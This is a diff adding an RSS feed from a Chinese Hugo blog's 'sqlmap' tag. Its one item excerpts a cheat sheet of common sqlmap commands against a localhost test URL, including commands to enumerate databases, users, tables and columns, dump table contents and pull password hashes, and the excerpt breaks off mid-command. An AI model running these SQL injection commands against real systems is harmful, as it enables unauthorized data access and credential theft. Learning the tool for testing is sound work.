@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>sqlmap on 壹零壹玖</title>
+    <link>https://1019.fun/tags/sqlmap/</link>
+    <description>Recent content in sqlmap on 壹零壹玖</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Thu, 06 Feb 2020 00:00:00 +0000</lastBuildDate>
+    
+	<atom:link href="https://1019.fun/tags/sqlmap/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>sqlmap常用命令</title>
+      <link>https://1019.fun/posts/sqlmap%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</link>
+      <pubDate>Thu, 06 Feb 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://1019.fun/posts/sqlmap%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</guid>
+      <description>基本信息 sqlmap -u &amp;#34;http://localhost/test.php?id=11&amp;#34; -v 5（5代表level,0-5） 所有dbs sqlmap -u &amp;#34;http://localhost/test.php?id=11&amp;#34; -v 5 --dbs 所有用户 sqlmap -u &amp;#34;http://localhost/test.php?id=11&amp;#34; -v 5 —users 当前使用的db sqlmap -u &amp;#34;http://localhost/test.php?id=11&amp;#34; -v 5 --current-db 当前用户 sqlmap -u &amp;#34;http://localhost/test.php?id=11&amp;#34; -v 5 --current-user 某个库所有表名 sqlmap -u &amp;#34;http://localhost/test.php?id=11&amp;#34; -v 1 -D test —tables 某个表所有列名 sqlmap -u &amp;#34;http://localhost/test.php?id=11&amp;#34; -v 0 -D test -T deskstatus —columns 某个表所有数据 sqlmap -u &amp;#34;http://localhost/test.php?id=11&amp;#34; -v 0 -D test -T deskstatus —dump 获取密码 sqlmap -u &amp;#34;http://localhost/test.php?id=11&amp;#34; --passwords 获取指定用户密码 sqlmap -u &amp;#34;http://localhost/test.</description>
+    </item>
+    
+  </channel>
+</rss>
